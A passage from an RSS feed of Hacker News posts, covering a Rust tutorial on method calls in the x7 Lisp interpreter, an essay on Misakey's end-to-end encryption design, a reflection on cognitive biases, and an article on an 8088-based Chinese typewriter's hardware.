      <span>// </span><span>record! is a macro to assist in making LispResult&lt;Expr::Record&gt; types</span>
      <span>record!</span><span>(</span><span>FileRecord</span>::new<span>(</span>f, abs_path<span>)</span><span>)</span>
  <span>}</span>

  <span>/// Open a file from x7</span>
  <span>/// This function signature will let us expose it directly to the interpreter</span>
  <span>pub</span><span>(</span><span>crate</span><span>)</span> <span>fn</span> <span>from_x7</span><span>(</span><span>exprs</span>: <span>Vector</span><span>&lt;</span><span>Expr</span><span>&gt;</span>, <span>_symbol_table</span>: &amp;<span>SymbolTable</span><span>)</span> -&gt; <span>LispResult</span><span>&lt;</span><span>Expr</span><span>&gt;</span> <span>{</span>
      <span>exact_len!</span><span>(</span>exprs, <span>1</span><span>)</span>;
      <span>let</span> <span>path</span> = exprs<span>[</span><span>0</span><span>]</span>.get_string<span>()</span><span>?</span>;
      <span>FileRecord</span>::open_file<span>(</span>path<span>)</span>
  <span>}</span>
<span>}</span>
</pre>
</div>
<p>
Now that we have the ability to make a <code>FileRecord</code>, we'll need to implement <code>Record</code>
so it can be understood by the interpreter (<code>Expr::Record</code>).
</p>
<div>
<pre><span>impl</span> <span>Record</span> <span>for</span> <span>FileRecord</span> <span>{</span>
    <span>fn</span> <span>call_method</span><span>(</span>&amp;<span>self</span>, <span>sym</span>: &amp;<span>str</span>, <span>args</span>: <span>Vector</span><span>&lt;</span><span>Expr</span><span>&gt;</span><span>)</span> -&gt; <span>LispResult</span><span>&lt;</span><span>Expr</span><span>&gt;</span> <span>{</span>
      <span>// </span><span>We have no methods yet.</span>
      <span>unknown_method!</span><span>(</span><span>self</span>, sym<span>)</span>
    <span>}</span>

    <span>fn</span> <span>type_name</span><span>(</span>&amp;<span>self</span><span>)</span> -&gt; &amp;'<span>static</span> <span>str</span> <span>{</span>
        <span>"FileRecord"</span>
    <span>}</span>

    <span>fn</span> <span>display</span><span>(</span>&amp;<span>self</span><span>)</span> -&gt; <span>String</span> <span>{</span>
        <span>format!</span><span>(</span><span>"File&lt;</span><span>{}</span><span>&gt;"</span>, <span>self</span>.path<span>)</span>
    <span>}</span>

    <span>fn</span> <span>debug</span><span>(</span>&amp;<span>self</span><span>)</span> -&gt; <span>String</span> <span>{</span>
        <span>self</span>.display<span>()</span>
    <span>}</span>

    <span>fn</span> <span>clone</span><span>(</span>&amp;<span>self</span><span>)</span> -&gt; <span>RecordType</span> <span>{</span>
        <span>Box</span>::new<span>(</span><span>Clone</span>::clone<span>(</span><span>self</span><span>)</span><span>)</span>
    <span>}</span>

    <span>fn</span> <span>methods</span><span>(</span>&amp;<span>self</span><span>)</span> -&gt; <span>Vec</span><span>&lt;</span>&amp;'<span>static</span> <span>str</span><span>&gt;</span> <span>{</span>
        <span>Vec</span>::new<span>()</span>
    <span>}</span>

    <span>fn</span> <span>id</span><span>(</span>&amp;<span>self</span><span>)</span> -&gt; <span>u64</span> <span>{</span>
        <span>use</span> <span>std</span>::<span>collections</span>::<span>hash_map</span>::<span>DefaultHasher</span>;
        <span>use</span> <span>std</span>::<span>hash</span>::<span>{</span><span>Hash</span>, <span>Hasher</span><span>}</span>;
        <span>let</span> <span>mut</span> <span>h</span> = <span>DefaultHasher</span>::new<span>()</span>;
        <span>self</span>.path.hash<span>(</span>&amp;<span>mut</span> h<span>)</span>;
        h.finish<span>()</span>
    <span>}</span>
<span>}</span>
</pre>
</div>
<p>
We also need to expose <code>FileRecord::from_x7</code> to the interpreter, so let's head back and add it to <code>make_stdlib_fns</code>:
</p>
<div>
<pre> <span>make_stdlib_fns!</span><span>{</span>
  <span>// </span><span>elided functions...</span>
  <span>(</span><span>"call_method"</span>, <span>2</span>, call_method, <span>true</span>, <span>"&lt;doc-string&gt;"</span><span>)</span>,
  <span>// </span><span>Open a file</span>
  <span>(</span><span>"fs::open"</span>, <span>1</span>, <span>FileRecord</span>::from_x7, <span>true</span>, <span>"Open a file."</span><span>)</span>,
<span>}</span>
</pre>
</div>
<p>
We can now compile and run <code>x7</code> to see what happens:
</p>
<div>
<pre>&gt;&gt;&gt; <span>(</span>def f <span>(</span>fs::open <span>"hello-world.txt"</span><span>)</span><span>)</span>
nil
&gt;&gt;&gt; f
File&lt;/home/david/programming/x7/hello-world.txt&gt;
</pre>
</div>
<p>
Nice! We've opened a file. We can now implement some other useful methods on <code>FileRecord</code> like reading from a file:
</p>
<div>
<pre><span>impl</span> <span>FileRecord</span> <span>{</span>
  <span>/// Read the contents of a file to a String,</span>
  <span>/// rewinding the cursor to the front.</span>
  <span>fn</span> <span>read_all</span><span>(</span>&amp;<span>self</span><span>)</span> -&gt; <span>LispResult</span><span>&lt;</span><span>String</span><span>&gt;</span> <span>{</span>
      <span>let</span> <span>mut</span> <span>buf</span> = <span>String</span>::new<span>()</span>;
      <span>let</span> <span>mut</span> <span>guard</span> = <span>self</span>.file.lock<span>()</span>;
      guard
          .read_to_string<span>(</span>&amp;<span>mut</span> buf<span>)</span>
          .map_err<span>(</span>|e| <span>anyhow!</span><span>(</span><span>"Failed to read to string {}"</span>, e<span>)</span><span>)</span><span>?</span>;
      <span>rewind_file!</span><span>(</span>guard<span>)</span>;
      <span>Ok</span><span>(</span>buf<span>)</span>
  <span>}</span>

  <span>/// Read the contents of a FileRecord to a string.</span>
  <span>fn</span> <span>read_to_string</span><span>(</span>&amp;<span>self</span>, <span>args</span>: <span>Vector</span><span>&lt;</span><span>Expr</span><span>&gt;</span><span>)</span> -&gt; <span>LispResult</span><span>&lt;</span><span>Expr</span><span>&gt;</span> <span>{</span>
      <span>// </span><span>We want no arguments.</span>
      <span>exact_len!</span><span>(</span>args, <span>0</span><span>)</span>;
      <span>self</span>.read_all<span>()</span>.map<span>(</span><span>Expr</span>::<span>String</span><span>)</span>
  <span>}</span>
<span>}</span>
</pre>
</div>
<p>
We can update our <code>Record</code> implementation for <code>FileRecord</code> to include this method:
</p>
<div>
<pre><span>impl</span> <span>Record</span> <span>for</span> <span>FileRecord</span> <span>{</span>
    <span>fn</span> <span>call_method</span><span>(</span>&amp;<span>self</span>, <span>sym</span>: &amp;<span>str</span>, <span>args</span>: <span>Vector</span><span>&lt;</span><span>Expr</span><span>&gt;</span><span>)</span> -&gt; <span>LispResult</span><span>&lt;</span><span>Expr</span><span>&gt;</span> <span>{</span>
        <span>match</span> sym <span>{</span>
            <span>"read_to_string"</span> =&gt; <span>self</span>.read_to_string<span>(</span>args<span>)</span>,
            _ =&gt; <span>unknown_method!</span><span>(</span><span>self</span>, sym<span>)</span>,
        <span>}</span>
    <span>}</span>
<span>}</span>
</pre>
</div>
<p>
And use it:
</p>
<div>
<pre>~ echo <span>"hello"</span> &gt; hello-world.txt
~ x7
&gt;&gt;&gt; <span>(</span>def f <span>(</span>fs::open <span>"hello-world.txt"</span><span>)</span><span>)</span>
&gt;&gt;&gt; <span>(</span>call_method f <span>"read_to_string"</span><span>)</span>
<span>"hello"</span>
</pre>
</div>
<p>
Awesome! We're able to call methods on <code>FileRecord</code>. It's the same process to implement <code>.write</code> and other useful file operations, so we'll elide it. This is great stuff, and would be even better with some syntactic sugar.
</p>
<p>
Let's add method call syntax so these two expressions are equal:
</p>
<div>
<pre>&gt;&gt;&gt; <span>(</span>call_method f <span>"read_to_string"</span><span>)</span>
&gt;&gt;&gt; <span>(</span>.read_to_string f<span>)</span>
</pre>
</div>
</div></div>]]>
            </description>
            <link>https://dpbriggs.ca/blog/Implementing-Method-Calls-In-x7</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514658</guid>
            <pubDate>Fri, 18 Sep 2020 09:19:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Year and a Half of End-to-End Encryption at Misakey]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24514370">thread link</a>) | @cedricvanrompay
<br/>
September 18, 2020 | https://about.misakey.com/cryptography/white-paper.html?pk_campaign=HackerNews_Cedric | <a href="https://web.archive.org/web/*/https://about.misakey.com/cryptography/white-paper.html?pk_campaign=HackerNews_Cedric">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
    <article>
      

<p>A journey through some of the reasonings and technical challenges that I had so far as a software developer at Misakey specialized in cryptography and security.</p>

<h2 id="how-i-got-here">How I Got Here</h2>
<p>I was recruited by Misakey shortly after its first fundraising (February 2019, ‚Ç¨1M). The mission of Misakey was, and still is as of today, to provide an easy-to-use and highly secure way to connect people to the numerous accounts they have on other websites, as well as to connect people between each other. One key element of the solution was to encrypt user data in an <em>end-to-end</em> fashion, meaning that, while the data exchanged by users and websites would flow through our servers, it would be encrypted with a key that Misakey does not have. Doing so greatly increases the security of user‚Äôs data, but it adds a lot of technical challenges.</p>
<p><em>‚ÄúDo not roll your own crypto‚Äù</em>: this adage is a reminder to software developers that cryptography is a very tricky discipline. Trying to build your own cryptography without a high degree of knowledge in this field is a sure way to introduce a security vulnerability in your product. Instead, you should rely entirely on third-party tools and services when it comes to cryptography, and you should avoid using them in a ‚Äúcreative‚Äù way.</p>
<p>At Misakey, we try to follow this principle as much as possible. For instance, we do TLS<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> in the most standard, boring, uncreative way. But end-to-end encryption is still quite a ‚Äúbleeding-edge‚Äù technology, and as a result you are not sure to find a tool that perfectly fits your needs. In this situation, there are two sane things to do: giving up, or investing massively in cryptographic expertise.</p>
<p>The founders of Misakey went for the second option. Unfortunately, professional software developers with a high expertise in cryptography are pretty rare. So they went for the opposite approach: they started looking for an expert in cryptography that would have decent skills in software development.</p>
<p>At that time, I had recently finished my PhD on cryptography and secure protocols after graduating as an engineer from <a href="https://www.telecom-paris.fr/">T√©l√©com Paris</a> and <a href="https://www.eurecom.fr/fr">EURECOM</a>. Although I had never worked as a professional software developer, I had been programming as a hobbyist since the age of 15, and the engineering schools I graduated from are quite specialized in I.T. After a few discussions on the phone with the founders, I was hired. The deal was that I would progressively become a professional software developer in his own right by programming with the rest of the team, while using my knowledge of cryptography to design and implement the protocols Misakey needs. I also had some training in general cyber security (‚Äúhacking‚Äù, sort of), so I would be quite active on this topic as well<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>.</p>
<h2 id="end-to-end-encryption">End-to-End Encryption</h2>
<p>End-to-end encryption is really booming these years. This is sometimes taking the form of what is called ‚Äúclient-side encryption‚Äù in some cloud-based services, like <a href="https://blog.cozy.io/en/cozy-cloud-how-to-encrypt-web-application/">what Cozy Cloud is doing</a> for instance, but the biggest trend is ‚Äúencrypted chat applications‚Äù. <a href="https://signal.org/blog/whatsapp-complete/">WhatsApp conversations use end-to-end encryption by default since 2016</a>, and <a href="https://signal.org/blog/facebook-messenger/">Facebook Messenger offers end-to-end encrypted conversations since more or less the same time</a>. <a href="https://telegram.org/">Telegram</a> is another popular chat application that offers end-to-end encryption, and there are a few other applications having a smaller market share, like <a href="https://signal.org/">Signal</a> and <a href="https://element.io/">Element</a> (formerly known as ‚ÄúRiot‚Äù).</p>
<figure>
    <img src="https://about.misakey.com/cryptography/images/e2e.png"> 
</figure>

<p>Before the rise of end-to-end encryption, messages were already encrypted in chat applications, but only with the TLS protocol<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup> that provides encryption from a device (a computer or a phone) to a server. In TLS, the device and the server negotiate an encryption key with each other so that they communicate securely, but because this key is known to the server, the server ‚Äúsees‚Äú the data. Most of the time this is perfectly fine because the data is actually intended for the server. For instance when you change your username in Misakey, the new user name is only encrypted with TLS. For most websites, TLS is (almost) all the cryptography that‚Äôs required to operate the service securely, and nowadays it‚Äôs quite simple for anyone to enable TLS on her website in a secure way thanks to <a href="https://letsencrypt.org/">Let‚Äôs Encrypt</a> and <a href="https://certbot.eff.org/">CertBot</a>.</p>
<p>The situation is different in chat applications and in services like Misakey that simply act as intermediaries between users: the server is not one of the ‚Äúends‚Äù of the conversation anymore, it simply forwards data between users having a conversation. As a result, you cannot claim to provide ‚Äúend-to-end encryption‚Äù simply because you are using TLS.</p>
<p>It doesn‚Äôt mean that a chat application using only TLS is ‚Äúless secure‚Äù than a usual website. It means that we could aim at a higher level of security: if the server doesn‚Äôt <em>need</em> to see the data, we have an opportunity to protect the data from a hack of the server, and we do this by making the server <em>unable</em> to read the data.</p>
<p>It is tempting to ask: why not just use TLS from device to device, then? One reason is that TLS simply does not work from device to device: in TLS, servers do most of the work, so it is not trivial to recreate the same protocol with just devices. A second reason is that TLS will not give us some properties that we want for Misakey, like conversations between more than two devices and/or users. Of course, we will regularly see how things are done in the TLS protocol to better understand how to build our end-to-end encryption protocol, but it cannot be as simple as <em>‚Äúusing TLS from device to device‚Äù</em>.</p>
<h2 id="existing-protocols-and-why-we-are-not-using-them">Existing Protocols and Why We Are Not Using Them</h2>
<p>The end-to-end encryption protocol used by WhatsApp, Facebook Messenger and Signal is the ‚ÄúSignal Protocol‚Äù (because it was first developed by Signal, who then helped WhatsApp and Facebook integrate it in their own app) whose <a href="https://signal.org/docs/">specification and implementation are free open-source software</a>. This means that in theory we could use it to build Misakey, but in practice the Signal protocol is not really meant to be used as a stable platform for building other end-to-end encrypted products.</p>
<p>Element is a bit different from the other encrypted chat applications. The main goal of the people behind Element is to promote an entire <em>messaging protocol</em>, called <a href="https://matrix.org/">the <em>Matrix Protocol</em></a>, whose original purpose was to <em>‚Äúreplace email‚Äù</em>. Element is simply a client for this protocol, but the developers want <a href="https://matrix.org/clients-matrix/">anyone to be able to implement their own client</a>, just like there are various programs to surf the Web or manage emails.</p>
<p>As a result, the Matrix protocol and the various parts of the Element application are designed to be usable as building blocks for other implementations and usage. In particular, <a href="https://github.com/matrix-org/matrix-js-sdk">the Matrix JS SDK</a> gives you a high-level interface to use the Matrix Protocol, including the end-to-end encryption part, without having to worry too much about the technical details of it: you enable end-to-end encryption in a chat room by calling <code>matrixClient.setRoomEncryption</code> with the ID of the chat room, and now all the messages sent to this room will be end-to-end encrypted, even if there are many people in it, each one using several devices. The Matrix team also provides a server for the Matrix Protocol, <a href="https://github.com/matrix-org/synapse">Synapse</a>, which is very easy to use.</p>
<p>At the beginning of Misakey, the idea was to use the Matrix protocol as a communication platform to build our product. This way we did not have to implement end-to-end encryption ourselves, and we could enjoy a mature protocol and implementation which we would not have to maintain ourselves.</p>
<p>The Matrix protocol, and <a href="https://gitlab.matrix.org/matrix-org/olm">its end-to-end encryption protocol named ‚Äúolm‚Äù</a>, are quite easy to use and to integrate in your own application ‚Ä¶ as long as the application you are trying to build is close enough to Element. Now Misakey is not exactly a ‚Äúchat‚Äù application, its goal is mainly directed towards automated management of people‚Äôs accounts and data. As a result, we had some feature requirements that were quite far from what Matrix was designed for, like sending data to people that don‚Äôt have an account yet, or seamless device-to-device synchronization. Implementing them with Matrix would have required to somehow ‚Äúbend‚Äù the protocol, using it in ways it was not designed for, and this seemed overly complicated.</p>
<p>There were also a few features we were missing from the Matrix JS SDK, mainly regarding key management in the olm protocol. We had no idea if we could push for their integration, and it seemed too much of a hassle to implement them in our own fork of Matrix. At some time <a href="https://github.com/matrix-org/matrix-js-sdk/pull/1167">we tried to contribute to the Matrix JS SDK</a>, but again this did not give us the speed we needed.</p>
<p>Maybe one day the Matrix protocol will become more versatile and we will be able to use it as a base for Misakey, but for now it seems faster to implement our own protocol, and to use Matrix as a source of inspiration. This lets us move faster, even if it is a great responsibility to implement end-to-end encryption from scratch. As we said, end-to-end encryption is a technology that is still quite ‚Äúyoung‚Äù.</p>
<h2 id="the-most-trivial-end-to-end-encryption-protocol">The Most Trivial End-to-End Encryption Protocol</h2>
<p>It‚Äôs time to start building things. The quickest way of deploying end-to-end encryption between two users is to do the following: first, make the application of one user generate an encryption key. Then, tell this user to send the key to the other user through some other communication channel, typically email or some other chat application,or in person. This ‚Äúother communication channel‚Äù must be secure enough. When the application of the other user receives the key, the applications of both users can use this key to encrypt data for each other.</p>
<figure>
    <img src="https://about.misakey.com/cryptography/images/basic-e2e.png" alt="chart illustrating basic end-to-end encryption with the key sent through an out-of-band channel"> 
</figure>

<p>Note that the key must <em>not</em> be sent through Misakey itself, otherwise it is not ‚Äúend-to-end encryption‚Äù any more. This is why I speak of <em>another</em> communication channel. This is called an <em>out-of-band channel</em> in end-to-end encryption.</p>
<p>Of course it is not ideal to have to assume that users <em>already</em> have this out-of-band channel to send cryptographic keys to each other in a secure manner. One could ‚Ä¶</p></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://about.misakey.com/cryptography/white-paper.html?pk_campaign=HackerNews_Cedric">https://about.misakey.com/cryptography/white-paper.html?pk_campaign=HackerNews_Cedric</a></em></p>]]>
            </description>
            <link>https://about.misakey.com/cryptography/white-paper.html?pk_campaign=HackerNews_Cedric</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514370</guid>
            <pubDate>Fri, 18 Sep 2020 08:35:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The stories we tell ourselves can make or break who we are]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24514358">thread link</a>) | @ochronus
<br/>
September 18, 2020 | https://ochronus.online/stories-we-tell-ourselves/ | <a href="https://web.archive.org/web/*/https://ochronus.online/stories-we-tell-ourselves/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
<div>
<article>

<figure>
<img srcset="https://ochronus.online/content/images/size/w300/2020/09/the-stories-we-tell-ourselves.jpg 300w,
                            https://ochronus.online/content/images/size/w600/2020/09/the-stories-we-tell-ourselves.jpg 600w,
                            https://ochronus.online/content/images/size/w1000/2020/09/the-stories-we-tell-ourselves.jpg 1000w,
                            https://ochronus.online/content/images/size/w2000/2020/09/the-stories-we-tell-ourselves.jpg 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://ochronus.online/content/images/size/w2000/2020/09/the-stories-we-tell-ourselves.jpg" alt="The stories we tell ourselves">
</figure>
<section>
<div>
<blockquote>‚ÄúWe tell ourselves stories in order to live‚Ä¶We look for the sermon in the suicide, for the social or moral lesson in the murder of five. We interpret what we see, select the most workable of the multiple choices. We live entirely, especially if we are writers, by the imposition of a narrative line upon disparate images, by the ‚Äúideas‚Äù with which we have learned to freeze the shifting phantasmagoria which is our actual experience.‚Äù ‚Äì <em><strong>Joan Didion</strong>, The White Album</em></blockquote><p>A good story can entertain, motivate, teach valuable lessons, and solidify good habits.</p><p>A bad story can demotivate, cause frustration and anger, and curb our capability to be fully ourselves.</p><p>These stories are not necessarily false but usually, they don‚Äôt tell the entire truth ‚Äî just one perspective. Another person could look at the same situation and tell a very different story. Telling ourselves stories is natural ‚Äî we all do it, all the time. There‚Äôs nothing inherently wrong with it. That said <strong><em>if we aren‚Äôt aware of this happening, we won‚Äôt understand how they shape our mood, actions, happiness, and relationships.</em></strong></p><h3 id="an-example-of-such-a-story-">An example of such a story:</h3><p><strong>The event:</strong> You submitted a pull request for review after half a day of work. Another engineer asked you to change half of your code and to increase your test coverage.</p><blockquote><strong><em>Your story:</em></strong> A nitpicking a**hole commented on every single thing I did in that pull request; I guess he has nothing better to do. I wish people stopped blocking me from making progress. Why are they always making game of me?!</blockquote><blockquote><strong><em>The other engineer‚Äôs story:</em></strong> Some terrible code almost went live today; thank god I checked that pull request! Why does it always have to be me to watch quality? It‚Äôs so sad it‚Äôs only important to me in this whole company‚Ä¶</blockquote><blockquote><strong><em>A bystander‚Äôs story:</em></strong> Whoa, that was some tense back-and-forth in the comments of that pull request. I wish people were just nicer to each other; we all want to do a good job at the end of the day, right?</blockquote><h2 id="roots-of-these-stories">Roots of these stories</h2><p>The most common origins of these stories are cognitive biases, our self-image made by / combined with our limiting beliefs, and our fears.</p><h3 id="our-self-image-and-limiting-beliefs">Our self-image and limiting beliefs</h3><p>Ultimately we all have an idea about what kind of a person we are. This idea subconsciously influences how we think, react, and make decisions. The image is usually closely tied to our fundamental values and worldview. Most of us want to be <em>good persons</em> in the end. What ‚Äòright‚Äô is is defined by these very values and core beliefs. Our self-image influences the stories we tell ourselves because we‚Äôre looking for ways to find justification in our day-to-day experience.</p><p>Thus this image can limit our perceived set of options and understanding of the world around us.</p><p>Related to the personas in the previous example:</p><ul><li>I‚Äôm the guy who gets things done (<em>might imply that I think others are slowpokes</em>)</li><li>As a professional software engineer I am the sole guardian of quality in the company (<em>might imply that I think others are careless or unprofessional</em>)</li><li>I‚Äôm the kind of person who cares for others' feelings (<em>might imply that I think others have lower EQ</em>)</li></ul><p>Of course these are simply bits and pieces of the whole image.</p><p>In all of the narratives above there are (hopefully unfounded) assumptions, lots of jumping to conclusions and unproductive, limiting language. In this particular situation, this locks the actors in the status quo, lowering the hope for change. It feels like a stalemate unless someone is willing to be more open.</p><p>By the way I‚Äôve written a bit about this earlier in the post titled <a href="https://ochronus.online/this-is-how-i-am/"><em>This is how I am</em></a></p><h3 id="our-fears">Our fears</h3><p>Fear also changes the kind of stories you tell yourself. Living in fear means giving up agency, seeing yourself as a passive spectator or a victim. It means seeing yourself as being controlled by circumstances, the actions of others, or your own emotions. And once the story you tell yourself becomes the story of a victim, you will be more and more likely to think and behave like a victim.</p><h3 id="cognitive-biases">Cognitive biases</h3><p>A cognitive bias is a systematic pattern of deviation from norm or rationality in judgment. They are basically ‚Äòshortcuts‚Äô our brains take so it can increase our mental efficiency by enabling us to make quick decisions without any conscious deliberation. Cognitive biases impact us in many areas of life, including social situations, memory recall, what we believe, and our behavior.</p><p>Some relevant and common cognitive biases from the staggering list of more than 180:</p><h4 id="self-serving-bias">Self-serving bias</h4><p>Self-serving bias is our tendency to blame external forces when bad things happen and give ourselves credit when good things happen. Although it can mean evading personal responsibility for your actions, self-serving bias is a defense mechanism that protects your self-esteem. In the example above, this means that if your pull request gets thumbs up from everyone, you attribute that to you being a fantastic engineer. On the other hand, if you get three comments asking you to change things, you might see others as nitpickers or your environment to be non-supportive instead of realizing you might have some room for improvement.</p><h4 id="confirmation-bias">Confirmation bias</h4><p>Confirmation bias, also known as confirmatory bias or the ‚Äúmyside bias,‚Äù is people‚Äôs tendency to seek out information that supports something they already believe. This type of bias affects our critical thinking, causing people to remember the hits and forget the misses ‚Äî a flaw in human reasoning. People will often cue into things that matter to them (the things that support their own beliefs) and dismiss those that don‚Äôt. Think about the other engineer overly obsessed with test coverage.</p><p>The tendency to attribute greater weight and accuracy to an authority figure‚Äôs opinion is at play here. Authority bias is the tendency to blindly follow or believe the instructions and views of a person in authority. We have a deeply rooted sense of duty to obey authority. How do you react when you get a comment on your pull request from a senior engineer you respect? How about if you get the same comment from a junior who just recently started at the company?</p><h2 id="so-what-can-we-do-about-it">So what can we do about it?</h2><p>Don‚Äôt forget that <em>we are the storytellers</em> - we have full control over the stories we make up. Everything starts with <strong>awareness</strong>. Stories are part of the software of our brains. They influence how we act, what‚Äôs important, and what to do when something goes wrong. But every software program has bugs. Awareness is your first step towards debugging.</p><p>Stop from time to time and think about the possibility that the story you‚Äôve just created is nothing more than a story. Consider alternative stories. Try telling the same story from other characters' side, think about what their narrative would look like.</p><p>Next time you find yourself in an upsetting situation, consider changing your story. Try this exercise: Recognize and acknowledge any feelings of fear. Hint: you may need to look underneath your anger! Ask yourself, what is it about this situation that is so upsetting? What do you believe to be ‚Äútrue‚Äù about it that feels threatening to you? As pretty much anything else, fear can be tackled one step at a time. There are ways to re-learn to say what you mean and to do what you feel is right. The good news here is that self-reinforcement works both ways. Once you‚Äôve practiced a bit and proven to yourself that it works (and that it‚Äôs less complicated than you thought), it gets easier to continue doing it.</p><p>We also must <strong>allow ourselves to be wrong.</strong> If we want to get closer to objective truths, we have to be able and ready to admit we were wrong, especially in the face of new data. If we can‚Äôt admit defeat, it makes us less capable of making discoveries in this world. We can avoid biases by being aware of our belief systems, whether our belief is for a religion, a political ideology, a cultural worldview, etc.. Let‚Äôs be open to disconfirmation, and allow ourselves to be wrong.</p><p>Self-compassion is an instrumental skill for reducing defensiveness and increasing your self-improvement motivation. It involves being kind and forgiving towards yourself, understanding that you are human and that other humans experience the same sort of experiences and failure and being able to identify uncomfortable thoughts without judging them.</p><blockquote>‚ÄúWho are we but the stories we tell ourselves, about ourselves, and believe?‚Äú ‚Äì <em><strong>Scott Turow</strong></em></blockquote><h2 id="some-fuel-for-further-thoughts">Some fuel for further thoughts</h2><p>How do you look like as a character in others' stories? Do you like that character? What can you do so that character goes through some positive development?</p><h2 id="in-case-you-want-to-read-more-about-the-topics-in-this-article-">In case you want to read more about the topics in this article:</h2><ul><li>I highly recommend <a href="http://www.ericberne.com/games-people-play/">‚ÄòGames People Play‚Äô by Eric Berne</a> from 1964 and it‚Äôs sequel <a href="http://www.ericberne.com/what-do-you-say-after-you-say-hello/">‚ÄòWhat Do You Say After You Say Hello?'</a> from 1970. The book didn‚Äôt age particularly well regarding some topics but the basic principle holds.</li><li>About cognitive bias: check out this beautiful <a href="https://www.visualcapitalist.com/wp-content/uploads/2017/09/cognitive-bias-infographic.html">visual map of cognitive biases</a> or if you like textual data more browse <a href="https://en.wikipedia.org/wiki/List_of_cognitive_biases">the relevant Wikipedia article</a> The book <a href="https://www.rickhanson.net/books/buddhas-brain/">‚ÄòBuddha‚Äôs Brain: The Practical Neuroscience of Happiness, Love, and Wisdom.'</a> - I know, such clickbaity title, but trust me, this book is pure gold.</li></ul><hr>
</div>

</section>

</article>
</div>
</div></div>]]>
            </description>
            <link>https://ochronus.online/stories-we-tell-ourselves/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514358</guid>
            <pubDate>Fri, 18 Sep 2020 08:34:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hardware Design of a 8088 based Chinese Typewriter made in the 1980s]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24514269">thread link</a>) | @tifan
<br/>
September 18, 2020 | https://tifan.net/blog/2020/09/17/ms240x-chinese-typewriter-2-ms-2401h-hardware-design/ | <a href="https://web.archive.org/web/*/https://tifan.net/blog/2020/09/17/ms240x-chinese-typewriter-2-ms-2401h-hardware-design/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <header id="banner">
      
    </header><!-- /#banner -->
    <!-- /#menu -->
<section id="content">
  <header>
    <h2>
      Stone MS-240x Typewriter (2): Hardware Design
    </h2> 
    
  </header>
  <!-- /.post-info -->
  <div>
    <p>In case you misseed it -- I talked about the backgrounds of the MS-240x typewriter in the <a href="https://tifan.net/blog/2020/09/09/revealing-a-forgotten-chinese-compute-history-stone-ms240x-chinese-typewritter-1-background/">previous article</a>. In this article, I'm going to discuss the hardware design of the legendary Stone MS-240x Chinese Typewriter (ÂõõÈÄö MS-240x ‰∏≠Ëã±ÊñáÊâìÂ≠óÊú∫) designed and sold in the mid-1980s.</p>
<p>Both the hardware and the BIOS was designed by ALPS Electric Co. ALPS provided a BIOS reference manual before the development began so that the developers in China could just write an emulator on the PC emulating the ALPS BIOS, and just focus on the development of the word processor.</p>
<div id="the-hardware">
<h2>The Hardware</h2>
<p><img alt="Stone MS-2401H ÂõõÈÄö MS-2401H ÊâìÂ≠óÊú∫" src="https://tifan.net/images/20200917-ms-2401h.jpg"></p><p>(<a href="https://www.lty.me/stone-ms-2401h/">Picture taken by @lty1993</a>)</p>
<p>As I mentioned in the previous article, the hardware is just a 8088 machine in its core. In the 80s, the Japanese engineer reverse engineered and implemented Japanese counterparts of almost all popular chips in the west. The ALPS motherboard is not an exception to that.</p>
<p>I bought the machine on Xianyu (Chinese eBay equivalent) and shipped it to @lty1993 in China for examination, disassembly, and ROM dumps. The machine is quite heavy -- shipping it to the west coast would probably cost 200 USD. Guess there won't be any Stone Chinese Typewriters in the US for a while!</p>
</div>
<div id="processor-nec-v20">
<h2>Processor: NEC V20</h2>
<p>Instead of using the actual 8088 processor, MS-240x series used the NEC V20 running at different clock frequencies. The original MS-2400 clocks at 4.9125 MHz, the upgraded MS-2401 runs at 8 MHz, and the later MS-2401H model runs at 10 MHz.</p>
<p>The V20 is 30% faster than the original 8088 running at the same clock speed, providing additional power for the heavy lifting work a Chinese Typewriters needs to do.</p>
</div>
<div id="memory-hard-wired-memory-map-with-page-control">
<h2>Memory: Hard-wired Memory Map with Page Control</h2>
<p>The RAM itself is not interesting at all. It's just a bunch of Japanese made SRAM connected to the address bus of the processor.</p>
<p>The BIOS is mapped at <cite>0xF8000</cite> to <cite>0xFFFF</cite>, and CPU will execute the instruction at <cite>0xFFFF0</cite> -- that's the convention for 8088. So naturally, the BIOS was hard wired at that address.</p>
<p>Remember we talked about the Chinese fonts? It's a mask ROM, and it is quite large -- larger than the address space of 8088 processor if we include high precision Chinese fonts at 24x24 dot (which is still pretty awful in today's standard). To solve this problem, all external ROMs were divided into 32KB pages. To access any page in the ROM, you would send a command to the ASIC to select the page first (bank switching) before reading memory from the hard wired memory location. Sounds like a MMU? Well, this <em>is</em> a poor man's MMU.</p>
<p>One thing worth noting is that all models have built in battery backup units. Newer models (such as MS-2401) can even operate with battery with up to 3 hours battery life -- it almost makes the typewritter a laptop with a built-in printer.</p>
<p>Here's the memory map for various models of the Chinese typewriter.</p>
<p><img alt="Memory Map for MS-2400" src="https://tifan.net/images/20200917-ms-2400-memory-map.png"></p><p>MS-2400 have the Chinese font mapped at <cite>0xA0000</cite> with 16 pages in total. It can support up to 3 Chinese IMEs (input methods, such as Pinyin, Wubi or Cangjie) -- a standard IME comes with the machine, up to 2 additional IMEs can be purchased as a EPROM chip inserted in the expansion ROM socket. As there's only 1 IME socket, regardless of how many IMEs would you purchase, you'll always get just one 64KB EPROM. The keyboards are mapped at <cite>0x90000</cite> and have up to 3 pages in total.</p>
